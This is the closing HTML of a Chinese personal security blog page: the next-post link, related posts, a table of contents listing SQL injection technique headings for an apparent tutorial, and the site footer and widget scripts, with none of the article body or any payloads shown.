onerror='onerror=null,src="/img/404.jpg"' alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">MySQL默认库及读写文件</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i> <span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/33159.html" title="SQL注入环境搭建和代码编写"><img class="cover" src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/u=3582485922,1626011992&fm=26&gp=0.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-07</div><div class="title">SQL注入环境搭建和代码编写</div></div></a></div><div><a href="/posts/8774.html" title="MySQL基础操作学习"><img class="cover" src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/rdbms.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-19</div><div class="title">MySQL基础操作学习</div></div></a></div><div><a href="/posts/36028.html" title="MySQL默认库及读写文件"><img class="cover" src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/mysql.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-19</div><div class="title">MySQL默认库及读写文件</div></div></a></div><div><a href="/posts/60533.html" title="Web环境搭建记录"><img class="cover" src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/lemp.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-19</div><div class="title">Web环境搭建记录</div></div></a></div><div><a href="/posts/22595.html" title="MySQL函数及提权"><img class="cover" src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/mysql2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-19</div><div class="title">MySQL函数及提权</div></div></a></div><div><a href="/posts/671.html" title="Web页面解析流程的学习"><img class="cover" src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/http.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-19</div><div class="title">Web页面解析流程的学习</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GET-Union%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">GET Union注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B5%8B%E8%AF%95"><span class="toc-number">1.1.</span> <span class="toc-text">手动测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Sqlmap%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">利用Sqlmap测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GET-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">GET 报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GET-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">GET 布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B5%8B%E8%AF%95-1"><span class="toc-number">3.1.</span> <span class="toc-text">手动测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8burpsuite%E6%B5%8B%E8%AF%95"><span class="toc-number">3.2.</span> <span class="toc-text">利用burpsuite测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GET-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.</span> <span class="toc-text">GET 时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B5%8B%E8%AF%95-2"><span class="toc-number">4.1.</span> <span class="toc-text">手动测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqlmap%E4%B8%8B%E6%B5%8B%E8%AF%95"><span class="toc-number">4.2.</span> <span class="toc-text">Sqlmap下测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POST-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">POST 报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B5%8B%E8%AF%95-3"><span class="toc-number">5.1.</span> <span class="toc-text">手动测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8burp-suite%E6%B5%8B%E8%AF%95"><span class="toc-number">5.2.</span> <span class="toc-text">利用burp suite测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Sqlmap%E6%B5%8B%E8%AF%95-1"><span class="toc-number">5.3.</span> <span class="toc-text">利用Sqlmap测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POST-%E5%B8%83%E5%B0%94%E3%80%81%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.</span> <span class="toc-text">POST 布尔、时间盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNSLog%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">DNSLog注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP%E5%A4%B4%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">HTTP头中的SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">10.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">11.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">12.</span> <span class="toc-text">Mysql注入读写文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5"><span class="toc-number">13.</span> <span class="toc-text">SQL注入绕过手段</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">14.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 By wawyw</div><div class="footer_custom_text"><p><a target="_blank" rel="external nofollow" href="https://beian.miit.gov.cn/"><img src="https://cdn.jsdelivr.net/gh/zjwo/CDN@master/img/blog/icp.png" style="vertical-align:text-bottom">&nbsp;赣ICP备2021001120号-1</a></p><a style="margin-inline:5px" target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px" target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px" target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px" target="_blank" href="https://coding.net/"><img src="https://img.shields.io/badge/Hosted-Coding-%2311dbb1" title="本站项目由 Coding 托管" alt="Coding"></a><a style="margin-inline:5px" target="_blank" href="https://www.jsdelivr.com/"><img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用 Jsdelivr 为静态资源提供CDN加速" alt="Jsdelivr"></a><a style="margin-inline:5px" target="_blank" href="https://cloud.tencent.com/product/cdn/"><img src="https://img.shields.io/badge/CDN-%E8%85%BE%E8%AE%AF%E4%BA%91-%2300a3ff" title="本站使用 腾讯云 为静态资源提供CDN加速" alt="腾讯云"></a><a style="margin-inline:5px" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div></div><hr><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader={endLoading:()=>{document.body.style.overflow="auto",document.getElementById("loading-box").classList.add("loaded")},initLoading:()=>{document.body.style.overflow="",document.getElementById("loading-box").classList.remove("loaded")}};window.addEventListener("load",()=>{preloader.endLoading()})</script><div class="js-pjax"><script>(()=>{const t=document.getElementById("twikoo-count"),o=()=>{let t={el:"#twikoo-wrap",envId:"twikoo-0gsrqna13c1dc448",region:""};twikoo.init(t)},n=()=>{twikoo.getCommentsCount({envId:"twikoo-0gsrqna13c1dc448",urls:[window.location.pathname],includeReply:!1}).then((function(o){t.innerText=o[0].count})).catch((function(t){console.error(t)}))},e=(e=!1)=>{"object"==typeof twikoo?(o(),e&&t&&setTimeout(n,0)):getScript("https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js").then(()=>{o(),e&&t&&setTimeout(n,0)})};e(!0)})()</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer src="/js/change.js"></script><script defer src="/js/history.js"></script><script defer src="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-card-history/baiduhistory/js/main.js"></script><script>var btn=document.getElementById("card-info-btn");btn.onclick=function(){alert("加入书签失败，有劳您手动Ctrl+D添加👉")}</script><div class="app-refresh" id="app-refresh"><div class="app-refresh-wrap"><label>✨ 网站已更新最新版本 👉</label> <a href="javascript:void(0)" onclick="location.reload()">点击刷新</a></div></div><script>function showNotification(){if(GLOBAL_CONFIG.Snackbar){var t="light"===document.documentElement.getAttribute("data-theme")?GLOBAL_CONFIG.Snackbar.bgLight:GLOBAL_CONFIG.Snackbar.bgDark,e=GLOBAL_CONFIG.Snackbar.position;Snackbar.show({text:"已更新最新版本",backgroundColor:t,duration:5e5,pos:e,actionText:"点击刷新",actionTextColor:"#fff",onActionClick:function(t){location.reload()}})}else{var o=`top: 0; background: ${"light"===document.documentElement.getAttribute("data-theme")?"#49b1f5":"#1f1f1f"};`;document.getElementById("app-refresh").style.cssText=o}}"serviceWorker"in navigator&&(navigator.serviceWorker.controller&&navigator.serviceWorker.addEventListener("controllerchange",(function(){showNotification()})),window.addEventListener("load",(function(){navigator.serviceWorker.register("/sw.js")})))</script><script defer src="https://apip.weatherdt.com/simple/static/js/weather-simple-common.js?v=2.0"></script><scrip async src="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js"></scrip><div class="aplayer no-destroy aplayer-withlist" data-id="7877671363" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listfolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><script defer src="https://cdn.jsdelivr.net/gh/lete114/CDN/Sum/sakura.js"></script><script>let backimg=["url(https://cdn.jsdelivr.net/gh/wawyw/img/xing.jpg)"],index=Math.ceil(Math.random()*(backimg.length-1));document.getElementById("web_bg").style.backgroundImage=backimg[index]</script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful=!0,POWERMODE.shake=!0,POWERMODE.mobile=!1,document.body.addEventListener("input",POWERMODE)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors=["title","#config_change","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"];var pjax=new Pjax({elements:'a:not([target="_blank"]):not([href="/friend-link-circle/"]):not([href="/archives/"]):not([href="/categories/"]):not([href="/tags/"])',selectors:pjaxSelectors,cacheBust:!1,analytics:!1,scrollRestoration:!1});document.addEventListener("pjax:complete",(function(){window.refreshFn(),document.querySelectorAll("script[data-pjax]").forEach(e=>{const t=document.createElement("script"),n=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach(e=>t.setAttribute(e.name,e.value)),t.appendChild(document.createTextNode(n)),e.parentNode.replaceChild(t,e)}),GLOBAL_CONFIG.islazyload&&window.lazyLoadInstance.update(),"function"==typeof chatBtnFn&&chatBtnFn(),"function"==typeof panguInit&&panguInit(),"function"==typeof gtag&&gtag("config","",{page_path:window.location.pathname}),"function"==typeof loadMeting&&document.getElementsByClassName("aplayer").length&&loadMeting(),"object"==typeof Prism&&Prism.highlightAll(),"object"==typeof preloader&&preloader.endLoading()})),document.addEventListener("pjax:send",(function(){if("object"==typeof preloader&&preloader.initLoading(),window.aplayers)for(let e=0;e<window.aplayers.length;e++)window.aplayers[e].options.fixed||window.aplayers[e].destroy();"object"==typeof typed&&typed.destroy();const e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode")}))</script><script>!function(){const t=document.createElement("script"),s=window.location.protocol.split(":")[0];t.src="https"===s?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js",t.dataset.pjax="";const e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)}()</script></div><script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.16/hexo_githubcalendar.js"></script><script data-pjax>function GithubCalendarConfig(){var t=document.getElementById("recent-posts");t&&"/"==location.pathname&&(console.log("已挂载github calendar"),t.insertAdjacentHTML("afterbegin",'<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>')),GithubCalendar("https://python-github-calendar-api.vercel.app/api?wawyw",["#ebedf0","#fdcdec","#fc9bd9","#fa6ac5","#f838b2","#f5089f","#c4067e","#92055e","#540336","#48022f","#30021f"],"wawyw")}document.getElementById("recent-posts")&&GithubCalendarConfig()</script><style>#github_container{min-height:280px}@media screen and (max-width:650px){#github_container{min-height:0}}</style><style></style></body></html>